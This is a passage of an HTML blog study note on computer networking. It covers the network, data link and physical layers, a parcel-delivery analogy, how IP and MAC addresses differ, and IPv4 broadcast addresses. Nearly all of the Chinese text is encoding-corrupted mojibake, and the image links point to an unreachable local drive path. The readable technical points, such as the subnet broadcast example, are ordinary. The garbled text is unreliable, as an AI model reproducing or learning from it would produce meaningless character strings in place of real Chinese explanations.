è¾“åˆ°å¦ä¸€ä¸ªè®¾å¤‡ï¼Œå®ç°ä¸»æœºä¸ä¸»æœºä¹‹é—´çš„é€šä¿¡ï¼Œä¹Ÿå«ç‚¹å¯¹ç‚¹ï¼ˆend to endï¼‰é€š ä¿¡ï¼Œä¸–ç•Œä¸Šé‚£ä¹ˆå¤šè®¾å¤‡ï¼Œåˆè¯¥å¦‚ä½•æ‰¾åˆ° å¯¹æ–¹å‘¢ï¼Ÿå› æ­¤ï¼Œç½‘ç»œå±‚éœ€è¦æœ‰åŒºåˆ†è®¾å¤‡çš„ç¼–å·ã€‚ æˆ‘ä»¬ä¸€èˆ¬ç”¨ IP åœ°å€ç»™è®¾å¤‡è¿›è¡Œç¼–å·ï¼Œå¯¹äº IPv4 åè®®ï¼Œ IP åœ°å€å…± 32 ä½ï¼Œåˆ†æˆäº†å›› æ®µï¼Œæ¯æ®µæ˜¯ 8 ä½ã€‚åªæœ‰ä¸€ä¸ªå•çº¯çš„ IP åœ°å€è™½ç„¶åšåˆ°äº†åŒºåˆ†è®¾å¤‡ï¼Œä½†æ˜¯å¯»å€èµ·æ¥å°±ç‰¹ åˆ«éº»çƒ¦ï¼Œå…¨ä¸–ç•Œé‚£ä¹ˆå¤šå°è®¾å¤‡ï¼Œéš¾é“ä¸€ä¸ªä¸€ä¸ªå»åŒ¹é…ï¼Ÿè¿™æ˜¾ç„¶ä¸ç§‘å­¦ã€‚ å› æ­¤ï¼Œéœ€è¦å°† IP åœ°å€åˆ†æˆä¸¤ç§æ„ä¹‰ï¼š ä¸€ä¸ªæ˜¯ç½‘ç»œå·ï¼Œè´Ÿè´£æ ‡è¯†è¯¥ IP åœ°å€æ˜¯å±äºå“ªä¸ªå­ç½‘çš„ï¼› ä¸€ä¸ªæ˜¯ä¸»æœºå·ï¼Œè´Ÿè´£æ ‡è¯†åŒä¸€å­ç½‘ä¸‹çš„ä¸åŒä¸»æœºï¼› æ€ä¹ˆåˆ†çš„å‘¢ï¼Ÿè¿™éœ€è¦é…åˆå­ç½‘æ©ç æ‰èƒ½ç®—å‡º IP åœ°å€ çš„ç½‘ç»œå·å’Œä¸»æœºå·ã€‚é‚£ä¹ˆåœ¨å¯»å€ çš„è¿‡ç¨‹ä¸­ï¼Œå…ˆåŒ¹é…åˆ°ç›¸åŒçš„ç½‘ç»œå·ï¼Œæ‰ä¼šå»æ‰¾å¯¹åº”çš„ä¸»æœºã€‚ é™¤äº†å¯»å€èƒ½åŠ›ï¼Œ IP åè®®è¿˜æœ‰å¦ä¸€ä¸ªé‡è¦çš„èƒ½åŠ›å°±æ˜¯è·¯ç”±ã€‚å®é™…åœºæ™¯ä¸­ï¼Œä¸¤å°è®¾å¤‡å¹¶ ä¸æ˜¯ç”¨ä¸€æ¡ç½‘çº¿è¿æ¥èµ·æ¥çš„ï¼Œè€Œæ˜¯é€šè¿‡å¾ˆå¤šç½‘å…³ã€è·¯ç”±å™¨ã€äº¤æ¢æœºç­‰ä¼—å¤šç½‘ç»œè®¾å¤‡è¿ æ¥èµ·æ¥çš„ï¼Œé‚£ä¹ˆå°±ä¼šå½¢æˆå¾ˆå¤šæ¡ç½‘ç»œçš„è·¯å¾„ï¼Œå› æ­¤å½“æ•°æ®åŒ…åˆ°è¾¾ä¸€ä¸ªç½‘ç»œèŠ‚ç‚¹ï¼Œå°±éœ€ è¦é€šè¿‡ç®—æ³•å†³å®šä¸‹ä¸€æ­¥èµ°å“ªæ¡è·¯å¾„ã€‚ æ‰€ä»¥ï¼ŒIP åè®®çš„å¯»å€ä½œç”¨æ˜¯å‘Šè¯‰æˆ‘ä»¬å»å¾€ä¸‹ä¸€ä¸ªç›®çš„åœ°è¯¥æœå“ªä¸ªæ–¹å‘èµ°ï¼Œè·¯ç”±åˆ™æ˜¯ æ ¹æ®ã€Œä¸‹ä¸€ä¸ªç›®çš„åœ°ã€é€‰æ‹©è·¯å¾„ã€‚å¯»å€æ›´åƒåœ¨å¯¼èˆªï¼Œè·¯ç”±æ›´åƒåœ¨æ“ä½œæ–¹å‘ç›˜</li></ul><p>![image-20241114203316631](F:\new myblog\STUDY\source\img\image-20241114203316631.png)</p><ul><li><strong>åŠŸèƒ½</strong>ï¼šè¿›è¡Œè·¯ç”±é€‰æ‹©ï¼Œå†³å®šæ•°æ®é€šè¿‡å“ªæ¡è·¯å¾„åˆ°è¾¾ç›®çš„åœ°ã€‚</li></ul><p>![image-20241114203117316](F:\new myblog\STUDY\source\img\image-20241114203117316.png)</p><hr><h4 id="4-æ•°æ®é“¾è·¯å±‚ï¼ˆData-Link-Layerï¼‰"><a href="#4-æ•°æ®é“¾è·¯å±‚ï¼ˆData-Link-Layerï¼‰" class="headerlink" title="4. æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰"></a>4. æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰</h4><ul><li><strong>ä½œç”¨</strong>ï¼šè´Ÿè´£åœ¨åŒä¸€ç½‘ç»œå†…çš„èŠ‚ç‚¹ä¹‹é—´ä¼ è¾“æ•°æ®ï¼Œä¿è¯æ•°æ®çš„å¯é ä¼ è¾“ã€‚</li><li><strong>ç‰¹æ€§</strong>ï¼šæ•°æ®é“¾è·¯å±‚ä½¿ç”¨ç‰©ç†åœ°å€ï¼ˆå¦‚MACåœ°å€ï¼‰æ¥è¿›è¡ŒèŠ‚ç‚¹çš„å¯»å€ã€‚</li><li>å®é™…åœºæ™¯ä¸­ï¼Œç½‘ç»œå¹¶ä¸æ˜¯ä¸€ä¸ªæ•´ä½“ï¼Œæ¯”å¦‚ä½ å®¶å’Œæˆ‘å®¶å°±ä¸å±äºä¸€ä¸ªç½‘ç»œï¼Œæ‰€ä»¥æ•°æ®ä¸ ä»…å¯ä»¥åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­è®¾å¤‡é—´è¿›è¡Œä¼ è¾“ï¼Œä¹Ÿå¯ä»¥è·¨ç½‘ç»œè¿›è¡Œä¼ è¾“ã€‚ ä¸€æ—¦æ•°æ®éœ€è¦è·¨ç½‘ç»œä¼ è¾“ï¼Œå°±éœ€è¦æœ‰ä¸€ä¸ªè®¾å¤‡åŒæ—¶åœ¨ä¸¤ä¸ªç½‘ç»œå½“ä¸­ï¼Œè¿™ä¸ªè®¾å¤‡ä¸€èˆ¬æ˜¯ è·¯ç”±å™¨ï¼Œè·¯ç”±å™¨å¯ä»¥é€šè¿‡è·¯ç”±è¡¨è®¡ç®—å‡ºä¸‹ä¸€ä¸ªè¦å»çš„ IP åœ°å€ã€‚ é‚£é—®é¢˜æ¥äº†ï¼Œè·¯ç”±å™¨æ€ä¹ˆçŸ¥é“è¿™ä¸ª IP åœ°å€æ˜¯å“ªä¸ªè®¾å¤‡çš„å‘¢ï¼Ÿ äºæ˜¯ï¼Œå°±éœ€è¦æœ‰ä¸€ä¸ªä¸“é—¨çš„å±‚æ¥æ ‡è¯†ç½‘ç»œä¸­çš„è®¾å¤‡ï¼Œè®©æ•°æ®åœ¨ä¸€ä¸ªé“¾è·¯ä¸­ä¼ è¾“ï¼Œè¿™å°± æ˜¯æ•°æ®é“¾è·¯å±‚ï¼ˆData Link Layerï¼‰ï¼Œå®ƒä¸»è¦ä¸ºç½‘ç»œå±‚æä¾›é“¾è·¯çº§åˆ«ä¼ è¾“çš„æœåŠ¡</li><li><strong>å¸¸è§åè®®</strong>ï¼šä»¥å¤ªç½‘åè®®ã€PPPï¼ˆç‚¹å¯¹ç‚¹åè®®ï¼‰ã€å¸§ä¸­ç»§ç­‰ã€‚</li><li><strong>åŠŸèƒ½</strong>ï¼šæä¾›é”™è¯¯æ£€æµ‹ã€å¸§åŒæ­¥ç­‰åŠŸèƒ½ã€‚</li></ul><hr><h4 id="5-ç‰©ç†å±‚ï¼ˆPhysical-Layerï¼‰"><a href="#5-ç‰©ç†å±‚ï¼ˆPhysical-Layerï¼‰" class="headerlink" title="5. ç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰"></a>5. ç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰</h4><ul><li><strong>ä½œç”¨</strong>ï¼šè´Ÿè´£æ¯”ç‰¹æµçš„ä¼ è¾“ï¼Œå³ç‰©ç†ä¸Šå°†æ•°æ®ä»ä¸€ä¸ªèŠ‚ç‚¹ä¼ é€åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ã€‚</li><li><strong>ç‰¹æ€§</strong>ï¼šç›´æ¥ä¸ç‰©ç†ä»‹è´¨ï¼ˆå¦‚ç½‘çº¿ã€å…‰çº¤ï¼‰ç›¸è¿ï¼Œå¤„ç†ç”µä¿¡å·æˆ–å…‰ä¿¡å·çš„ä¼ è¾“ã€‚</li><li>å½“æ•°æ®å‡†å¤‡è¦ä»è®¾å¤‡å‘é€åˆ°ç½‘ç»œæ—¶ï¼Œéœ€è¦æŠŠæ•°æ®åŒ…è½¬æ¢æˆç”µä¿¡å·ï¼Œè®©å…¶å¯ä»¥åœ¨ç‰©ç†ä»‹ è´¨ä¸­ä¼ è¾“ï¼Œè¿™ä¸€å±‚å°±æ˜¯ç‰©ç†å±‚ï¼ˆPhysical Layerï¼‰ï¼Œå®ƒä¸»è¦æ˜¯ä¸ºæ•°æ®é“¾è·¯å±‚æä¾›äºŒè¿› åˆ¶ä¼ è¾“çš„æœåŠ¡</li><li><strong>åŠŸèƒ½</strong>ï¼šå®šä¹‰äº†ç‰©ç†ä»‹è´¨çš„æ¥å£æ ‡å‡†ï¼Œå¦‚ç”µå‹ã€é¢‘ç‡ã€ä¿¡é“ç­‰ã€‚</li></ul><p>![image-20241114203211430](F:\new myblog\STUDY\source\img\image-20241114203211430.png)</p><ol><li><strong>åº”ç”¨å±‚ï¼šå‘é€åŒ…è£¹</strong></li></ol><ul><li>åº”ç”¨å±‚å°±åƒå¯„ä»¶äººï¼Œæˆ‘ä»¬æƒ³æŠŠåŒ…è£¹å¯„ç»™è¿œæ–¹çš„æœ‹å‹ã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæˆ‘ä»¬å…³æ³¨çš„æ˜¯<strong>å¯„ä»€ä¹ˆ</strong>ï¼ˆæ¯”å¦‚ä¿¡ä»¶ã€åŒ…è£¹ï¼‰å’Œ<strong>å¯„ç»™è°</strong>ã€‚</li><li>åº”ç”¨å±‚æä¾›äº†å„ç§â€œå¯„åŒ…è£¹â€çš„æ–¹å¼ï¼Œæ¯”å¦‚æµè§ˆç½‘é¡µã€å‘é€é‚®ä»¶ã€ä¸‹è½½æ–‡ä»¶ç­‰ã€‚</li><li>å°±åƒå¯„åŒ…è£¹æ—¶ä¸å…³å¿ƒå¿«é€’å…¬å¸æ€ä¹ˆè¿é€ä¸€æ ·ï¼Œåº”ç”¨å±‚ä¹Ÿä¸å…³å¿ƒæ•°æ®æ˜¯å¦‚ä½•ä¼ è¾“çš„ã€‚</li></ul><ol start="2"><li><strong>ä¼ è¾“å±‚ï¼šåˆ†åŒ…å’Œè´´ä¸Šæ ‡ç­¾</strong></li></ol><ul><li>ä¼ è¾“å±‚è´Ÿè´£æŠŠâ€œå¤§åŒ…è£¹â€åˆ†æˆâ€œå¤šä¸ªå°åŒ…è£¹â€ï¼Œå¹¶åœ¨æ¯ä¸ªåŒ…è£¹ä¸Šè´´ä¸Šå‘ä»¶äººå’Œæ”¶ä»¶äººçš„æ ‡ç­¾ï¼Œä»¥ä¾¿å¿«é€’å…¬å¸èƒ½æŒ‰é¡ºåºé€è¾¾æ¯ä¸ªå°åŒ…è£¹ã€‚</li><li>æœ‰äº›åŒ…è£¹å¯èƒ½ä¼šä¸¢å¤±ï¼Œä¼ è¾“å±‚è´Ÿè´£æ£€æŸ¥å“ªäº›åŒ…è£¹æ²¡é€åˆ°ï¼Œå¹¶è®©å¿«é€’å…¬å¸é‡æ–°é€ã€‚</li><li>è¿™å°±åƒå¿«é€’å…¬å¸è´´ä¸Šçš„å¿«é€’å•ï¼Œç¡®ä¿æ¯ä¸ªåŒ…è£¹èƒ½è¢«é€åˆ°æ­£ç¡®çš„æ”¶ä»¶äººæ‰‹ä¸­ã€‚</li></ul><ol start="3"><li><strong>ç½‘ç»œå±‚ï¼šè§„åˆ’è·¯çº¿</strong></li></ol><ul><li>ç½‘ç»œå±‚è´Ÿè´£é€‰æ‹©â€œå¿«é€’è·¯çº¿â€ï¼Œå†³å®šåŒ…è£¹ä»å“ªä¸ªä»“åº“åˆ°å“ªä¸ªä¸­è½¬ç«™ï¼Œå†åˆ°æœ€ç»ˆçš„é…é€ç«™ã€‚</li><li>å®ƒç›¸å½“äºä¸€å¼ åœ°å›¾ï¼Œæ ¹æ®æœ€ä¼˜è·¯å¾„æŠŠåŒ…è£¹é€åˆ°ç›®æ ‡åœ°ç‚¹é™„è¿‘ã€‚</li><li>å°±åƒåœ°å›¾æŒ‡å¼•å¿«é€’å‘˜èµ°å“ªæ¡è·¯ï¼Œç½‘ç»œå±‚ç”¨IPåœ°å€æ¥æ‰¾åˆ°å»å¾€æ”¶ä»¶äººæ‰€åœ¨åŸå¸‚æˆ–å°åŒºçš„æœ€ä½³è·¯å¾„ã€‚</li></ul><ol start="4"><li><strong>æ•°æ®é“¾è·¯å±‚ï¼šæœ¬åœ°é…é€</strong></li></ol><ul><li>æ•°æ®é“¾è·¯å±‚è´Ÿè´£åœ¨â€œæœ€åä¸€å…¬é‡Œâ€æŠŠåŒ…è£¹é€åˆ°ç›®çš„åœ°é™„è¿‘çš„å°åŒºæˆ–å¤§æ¥¼ã€‚</li><li>å®ƒå°±åƒå¿«é€’å°å“¥åœ¨å°åŒºå†…æŒ¨å®¶æŒ¨æˆ·åœ°åˆ†å‘åŒ…è£¹ã€‚</li><li>è¿™å±‚æ˜¯æœ€æ¥è¿‘è®¾å¤‡æœ¬åœ°çš„ï¼Œä½¿ç”¨è®¾å¤‡çš„â€œç‰©ç†åœ°å€â€ï¼ˆç±»ä¼¼é—¨ç‰Œå·ï¼‰æ¥æ‰¾åˆ°æ”¶ä»¶äººã€‚</li></ul><ol start="5"><li><strong>ç‰©ç†å±‚ï¼šä¼ è¾“åŒ…è£¹çš„è½¦è¾†å’Œé“è·¯</strong></li></ol><ul><li>ç‰©ç†å±‚æ˜¯æœ€åº•å±‚ï¼Œè´Ÿè´£å®é™…æŠŠåŒ…è£¹ä»ä¸€ä¸ªåœ°æ–¹è¿è¾“åˆ°å¦ä¸€ä¸ªåœ°æ–¹ã€‚</li><li>å®ƒç›¸å½“äºå¿«é€’å…¬å¸ä½¿ç”¨çš„â€œå¿«é€’è½¦ã€ç«è½¦æˆ–é£æœºâ€ç­‰å·¥å…·ï¼ŒæŠŠåŒ…è£¹ç‰©ç†åœ°ç§»åŠ¨ã€‚</li><li>å°±åƒä¸€è¾†è¾†è£…ç€åŒ…è£¹çš„å¿«é€’è½¦åœ¨è·¯ä¸Šè¡Œé©¶ï¼Œç‰©ç†å±‚ä½¿ç”¨ç”µç¼†ã€å…‰çº¤ç­‰åª’ä»‹ä¼ è¾“æ•°æ®ï¼Œç¡®ä¿ä¿¡å·ä¼ åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚</li></ul><p>æ€»ç»“ä¸€ä¸‹</p><ul><li><strong>åº”ç”¨å±‚</strong>ï¼šå†³å®šè¦å‘ä»€ä¹ˆä¸œè¥¿ï¼ˆæ•°æ®ï¼‰å’Œå‘ç»™è°ï¼ˆç›®æ ‡ï¼‰ã€‚</li><li><strong>ä¼ è¾“å±‚</strong>ï¼šæŠŠå¤§ä»¶åˆ†æˆå°ä»¶ï¼Œæ¯ä»¶éƒ½è´´å¥½æ”¶ä»¶äººåœ°å€ã€‚</li><li><strong>ç½‘ç»œå±‚</strong>ï¼šè§„åˆ’è·¯çº¿ï¼ŒæŠŠå°åŒ…è£¹é€åˆ°æ­£ç¡®çš„åŸå¸‚æˆ–å°åŒºã€‚</li><li><strong>æ•°æ®é“¾è·¯å±‚</strong>ï¼šè´Ÿè´£æœ¬åœ°çš„é…é€ï¼Œæ‰¾åˆ°å…·ä½“çš„æ¥¼å±‚æˆ–é—¨ç‰Œå·ã€‚</li><li><strong>ç‰©ç†å±‚</strong>ï¼šè®©å¿«é€’è½¦ã€ç«è½¦ç­‰å·¥å…·å®é™…è¿è¾“åŒ…è£¹ã€‚</li></ul><p>é€šè¿‡è¿™ç§å±‚å±‚åä½œï¼Œæ•°æ®æœ€ç»ˆèƒ½å‡†ç¡®åœ°ä»ä¸€å°è®¾å¤‡ä¼ åˆ°å¦ä¸€å°è®¾å¤‡ã€‚</p><h4 id="IP-å’Œ-MAC"><a href="#IP-å’Œ-MAC" class="headerlink" title="IP å’Œ MAC"></a>IP å’Œ MAC</h4><ul><li><strong>IP åœ°å€ï¼ˆç½‘ç»œå±‚ï¼‰</strong>ï¼šIP è´Ÿè´£â€œè·¨åŒºâ€ä¼ è¾“æ•°æ®ï¼Œå®ƒåƒæ˜¯æˆ‘ä»¬å‡ºè¡Œæ—¶çš„<strong>è¡Œç¨‹è¡¨</strong>ï¼Œå®šä¹‰äº†æ•°æ®ä»æºå¤´åˆ°ç›®çš„åœ°çš„æ•´ä½“è·¯å¾„ã€‚IP åœ°å€ä¸»è¦ç”¨äºåœ¨ä¸åŒç½‘ç»œä¹‹é—´ä¼ è¾“æ•°æ®ï¼Œæ˜¯ä¸€ä¸ªå…¨å±€çš„åœ°å€ï¼Œæ ‡è¯†æ¯ä¸ªè®¾å¤‡åœ¨ç½‘ç»œä¸­çš„ä½ç½®ã€‚</li><li><strong>MAC åœ°å€ï¼ˆæ•°æ®é“¾è·¯å±‚ï¼‰</strong>ï¼šMAC è´Ÿè´£â€œå±€éƒ¨â€ä¼ è¾“æ•°æ®ï¼Œå®ƒåƒæ˜¯æˆ‘ä»¬ä¹˜åäº¤é€šå·¥å…·çš„<strong>è½¦ç¥¨</strong>ï¼Œé™å®šäº†æ•°æ®åœ¨ä¸€ä¸ªç‰¹å®šç½‘ç»œåŒºé—´å†…çš„ä¼ è¾“ã€‚MAC åœ°å€æ˜¯è®¾å¤‡çš„ç‰©ç†åœ°å€ï¼Œæ ‡è¯†äº†åŒä¸€ä¸ªç½‘ç»œåŒºé—´ï¼ˆå¦‚å±€åŸŸç½‘ï¼‰å†…è®¾å¤‡ä¹‹é—´çš„é€šä¿¡ã€‚</li></ul><p>å…³ç³»</p><ul><li>å½“æ•°æ®éœ€è¦ä¼ è¾“æ—¶ï¼Œ<strong>IP åœ°å€</strong>ä¼šæŒ‡å®šæ•´ä¸ªè¡Œç¨‹çš„èµ·ç‚¹å’Œç»ˆç‚¹ï¼ˆæº IP å’Œç›®çš„ IPï¼‰ï¼Œç¡®ä¿æ•°æ®èƒ½ä¼ é€’åˆ°ç›®æ ‡è®¾å¤‡æ‰€åœ¨çš„ç½‘ç»œã€‚</li><li>åœ¨è¿™ä¸ªä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œæ•°æ®ä¼šç»è¿‡å¤šä¸ªç½‘ç»œåŒºé—´ï¼Œæ¯ç»è¿‡ä¸€ä¸ªæ–°çš„ç½‘ç»œåŒºé—´ï¼Œ<strong>MAC åœ°å€</strong>ä¼šæŒ‡å¼•æ•°æ®åœ¨å½“å‰ç½‘ç»œåŒºé—´å†…çš„ä¼ è¾“ï¼Œç¡®ä¿æ•°æ®ä»ä¸€ä¸ªèŠ‚ç‚¹ä¼ é€’åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç›´è‡³æŠµè¾¾ç›®æ ‡ç½‘ç»œã€‚</li></ul><p>ä¸¾ä¾‹</p><p>å°æ—çš„å‡ºè¡Œç¤ºä¾‹å¯ä»¥è¿›ä¸€æ­¥ç†è§£è¿™ä¸ªè¿‡ç¨‹ï¼š</p><p>ä¸¾ä¸ªç”Ÿæ´»çš„æ —å­ï¼Œå°æ—è¦å»ä¸€ä¸ªå¾ˆè¿œçš„åœ°æ–¹æ—…è¡Œï¼Œåˆ¶å®šäº†ä¸€ä¸ªè¡Œç¨‹è¡¨ï¼Œå…¶é—´éœ€å…ˆåä¹˜ åé£æœºã€åœ°é“ã€å…¬äº¤è½¦æ‰èƒ½æŠµè¾¾ç›®çš„åœ°ï¼Œä¸ºæ­¤å°æ—éœ€è¦ä¹°é£æœºç¥¨ï¼Œåœ°é“ç¥¨ç­‰ã€‚ é£æœºç¥¨å’Œåœ°é“ç¥¨éƒ½æ˜¯å»å¾€ç‰¹å®šçš„åœ°ç‚¹çš„ï¼Œæ¯å¼ ç¥¨åªèƒ½å¤Ÿåœ¨æŸä¸€é™å®šåŒºé—´å†…ç§»åŠ¨ï¼Œæ­¤å¤„ çš„ã€ŒåŒºé—´å†…ã€å°±å¦‚åŒé€šä¿¡ç½‘ç»œä¸­æ•°æ®é“¾è·¯ã€‚ åœ¨åŒºé—´å†…ç§»åŠ¨ç›¸å½“äºæ•°æ®é“¾è·¯å±‚ï¼Œå……å½“åŒºé—´å†…ä¸¤ä¸ªèŠ‚ç‚¹ä¼ è¾“çš„åŠŸèƒ½ï¼ŒåŒºé—´å†…çš„å‡ºå‘ç‚¹ å¥½æ¯”æº MAC åœ°å€ï¼Œç›®æ ‡åœ°ç‚¹å¥½æ¯”ç›®çš„ MAC åœ°å€ã€‚ æ•´ä¸ªæ—…æ¸¸è¡Œç¨‹è¡¨å°±ç›¸å½“äºç½‘ç»œå±‚ï¼Œå……å½“è¿œç¨‹å®šä½çš„åŠŸèƒ½ï¼Œè¡Œç¨‹çš„å¼€å§‹å¥½æ¯”æº IPï¼Œè¡Œ ç¨‹çš„ç»ˆç‚¹å¥½æ¯”ç›®çš„ IP åœ°å€ã€‚å¦‚æœå°æ—åªæœ‰è¡Œç¨‹è¡¨è€Œæ²¡æœ‰è½¦ç¥¨ï¼Œå°±æ— æ³•æ­ä¹˜äº¤é€šå·¥å…·åˆ°è¾¾ç›®çš„åœ°ã€‚ç›¸åï¼Œå¦‚æœé™¤äº† è½¦ç¥¨è€Œæ²¡æœ‰è¡Œç¨‹è¡¨ï¼Œææ€•ä¹Ÿå¾ˆéš¾åˆ°è¾¾ç›®çš„åœ°ã€‚å› ä¸ºå°æ—ä¸çŸ¥é“è¯¥åä»€ä¹ˆè½¦ï¼Œä¹Ÿä¸çŸ¥é“ è¯¥åœ¨å“ªé‡Œæ¢ä¹˜ã€‚ å› æ­¤ï¼Œåªæœ‰ä¸¤è€…å…¼å¤‡ï¼Œæ—¢æœ‰æŸä¸ªåŒºé—´çš„è½¦ç¥¨åˆæœ‰æ•´ä¸ªæ—…è¡Œçš„è¡Œç¨‹è¡¨ï¼Œæ‰èƒ½ä¿è¯åˆ°è¾¾ç›® çš„åœ°ã€‚ä¸æ­¤ç±»ä¼¼ï¼Œè®¡ç®—æœºç½‘ç»œä¸­ä¹Ÿéœ€è¦ã€Œæ•°æ®é“¾è·¯å±‚ã€å’Œã€Œç½‘ç»œå±‚ã€è¿™ä¸ªåˆ†å±‚æ‰èƒ½å® ç°å‘æœ€ç»ˆç›®æ ‡åœ°å€çš„é€šä¿¡ã€‚ è¿˜æœ‰é‡è¦ä¸€ç‚¹ï¼Œæ—…è¡Œé€”ä¸­æˆ‘ä»¬è™½ç„¶ä¸æ–­å˜åŒ–äº†äº¤é€šå·¥å…·ï¼Œä½†æ˜¯æ—…è¡Œè¡Œç¨‹çš„èµ·å§‹åœ°å€å’Œ ç›®çš„åœ°å€å§‹ç»ˆéƒ½æ²¡å˜ã€‚å…¶å®ï¼Œåœ¨ç½‘ç»œä¸­æ•°æ®åŒ…ä¼ è¾“ä¸­ä¹Ÿæ˜¯å¦‚æ­¤ï¼ŒæºIPåœ°å€å’Œç›®æ ‡IPåœ° å€åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šå˜åŒ–çš„ï¼Œåªæœ‰æº MAC åœ°å€å’Œç›®æ ‡ MAC ä¸€ç›´åœ¨å˜åŒ–</p><ul><li><p><strong>è¡Œç¨‹è¡¨ï¼ˆIP åœ°å€ï¼‰</strong>ï¼šå°æ—çŸ¥é“å‡ºå‘ç‚¹å’Œç»ˆç‚¹åœ¨å“ªé‡Œï¼Œéœ€è¦ç»è¿‡å“ªäº›åŸå¸‚æˆ–åœ°ç‚¹ã€‚è¿™æ˜¯ç½‘ç»œå±‚ IP çš„ä½œç”¨â€”â€”ç¡®ä¿æ•°æ®æœ€ç»ˆèƒ½è·¨è¶Šå¤šä¸ªç½‘ç»œåŒºé—´ï¼Œåˆ°è¾¾ç›®çš„ç½‘ç»œã€‚</p></li><li><p><strong>è½¦ç¥¨ï¼ˆMAC åœ°å€ï¼‰</strong>ï¼šå°æ—åœ¨æ¯ä¸ªç‰¹å®šçš„åŒºé—´ï¼ˆå¦‚æœºåœºã€åœ°é“ç«™ã€å…¬äº¤ç«™ï¼‰ä¹°ç¥¨ï¼Œä»ä¸€ä¸ªäº¤é€šèŠ‚ç‚¹ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚è¿™å°±æ˜¯æ•°æ®é“¾è·¯å±‚ MAC çš„ä½œç”¨â€”â€”åœ¨å±€éƒ¨çš„ç½‘ç»œç¯å¢ƒä¸­ï¼Œä»ä¸€ä¸ªè®¾å¤‡ä¼ åˆ°å¦ä¸€ä¸ªè®¾å¤‡ï¼Œé€æ­¥æ¨è¿›æ•°æ®åˆ°ç›®æ ‡ã€‚</p><p>æ€»ç»“</p><p>IP åœ°å€æ˜¯â€œå…¨å±€è·¯çº¿å›¾â€ï¼Œç”¨äºç¡®å®šè¿œè·ç¦»çš„ç½‘ç»œä¼ è¾“æ–¹å‘ã€‚MAC åœ°å€æ˜¯â€œå±€éƒ¨å¯¼èˆªâ€ï¼Œè´Ÿè´£åœ¨åŒä¸€å±€åŸŸç½‘å†…çš„æ•°æ®ä¼ è¾“ã€‚ä¸¤è€…ç¼ºä¸€ä¸å¯ï¼Œåªæœ‰ IP åœ°å€å’Œ MAC åœ°å€å…±åŒåä½œï¼Œæ‰èƒ½è®©æ•°æ®æˆåŠŸåœ°ä»æºå¤´ä¼ é€’åˆ°ç›®çš„åœ°ã€‚</p></li></ul><p>IPåœ°å€çš„åŸºç¡€çŸ¥è¯†  IPåœ°å€çš„å®šä¹‰  åœ¨ TCP&#x2F;IP ç½‘ç»œé€šä¿¡æ—¶ï¼Œä¸ºäº†ä¿è¯èƒ½æ­£å¸¸é€šä¿¡ï¼Œæ¯ä¸ªè®¾å¤‡éƒ½éœ€è¦é…ç½®æ­£ç¡®çš„ IP åœ°å€ï¼Œ å¦åˆ™æ— æ³•å®ç°æ­£å¸¸çš„é€šä¿¡ã€‚ IP åœ°å€ï¼ˆIPv4 åœ°å€ï¼‰ç”±  32 ä½æ­£æ•´æ•°æ¥è¡¨ç¤ºï¼ŒIP åœ°å€åœ¨è®¡ç®—æœºæ˜¯ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼å¤„ ç†çš„ã€‚ è€Œäººç±»ä¸ºäº†æ–¹ä¾¿è®°å¿†é‡‡ç”¨äº†ç‚¹åˆ†åè¿›åˆ¶çš„æ ‡è®°æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯å°† 32 ä½ IP åœ°å€ä»¥æ¯ 8  ä½ä¸ºç»„ï¼Œå…±åˆ†ä¸º 4 ç»„ï¼Œæ¯ç»„ä»¥ã€Œ.ã€éš”å¼€ï¼Œå†å°†æ¯ç»„è½¬æ¢æˆåè¿›åˆ¶</p><p>![image-20241114203640359](F:\new myblog\STUDY\source\img\image-20241114203640359.png)</p><p>![image-20241114203659730](F:\new myblog\STUDY\source\img\image-20241114203659730.png)</p><p>åœ¨ IP åœ°å€ä¸­ï¼Œæœ‰ä¸¤ä¸ª IP æ˜¯ç‰¹æ®Šçš„ï¼Œåˆ†åˆ«æ˜¯ä¸»æœºå·å…¨ä¸º 1 å’Œ å…¨ä¸º 0 åœ°å€</p><p>ä¸»æœºå·å…¨ä¸º 1 æŒ‡å®šæŸä¸ªç½‘ç»œä¸‹çš„æ‰€æœ‰ä¸»æœºï¼Œç”¨äºå¹¿æ’­ ä¸»æœºå·å…¨ä¸º 0 æŒ‡å®šæŸä¸ªç½‘ç»œã€‚å¹¿æ’­åœ°å€ç”¨äºåœ¨åŒä¸€ä¸ªé“¾è·¯ä¸­ç›¸äº’è¿æ¥çš„ä¸»æœºä¹‹é—´å‘é€æ•°æ®åŒ…</p><p>![image-20241114203803343](F:\new myblog\STUDY\source\img\image-20241114203803343.png)</p><p>å­¦æ ¡ç­çº§ä¸­å°±æœ‰å¹¿æ’­çš„ä¾‹å­ï¼Œåœ¨å‡†å¤‡ä¸Šè¯¾çš„æ—¶å€™ï¼Œé€šå¸¸ç­é•¿ä¼šå–Šï¼šâ€œä¸Šè¯¾ï¼Œ å…¨ä½“èµ· ç«‹ï¼â€ï¼Œç­é‡Œçš„åŒå­¦å¬åˆ°è¿™å¥è¯æ˜¯ä¸æ˜¯å…¨éƒ¨éƒ½ç«™èµ·æ¥äº†ï¼Ÿè¿™ä¸ªå¥è¯å°±æœ‰å¹¿æ’­çš„å«ä¹‰ã€‚ å½“ä¸»æœºå·å…¨ä¸º 1 æ—¶ï¼Œå°±è¡¨ç¤ºè¯¥ç½‘ç»œçš„å¹¿æ’­åœ°å€ã€‚ä¾‹å¦‚æŠŠ  172.20.0.0&#x2F;16 ç”¨äºŒè¿›åˆ¶è¡¨ ç¤ºå¦‚ä¸‹ï¼š 10101100.00010100.00000000.00000000 å°†è¿™ä¸ªåœ°å€çš„ä¸»æœºéƒ¨åˆ†å…¨éƒ¨æ”¹ä¸º 1ï¼Œåˆ™å½¢æˆå¹¿æ’­åœ°å€ï¼š 10101100.00010100.11111111.11111111 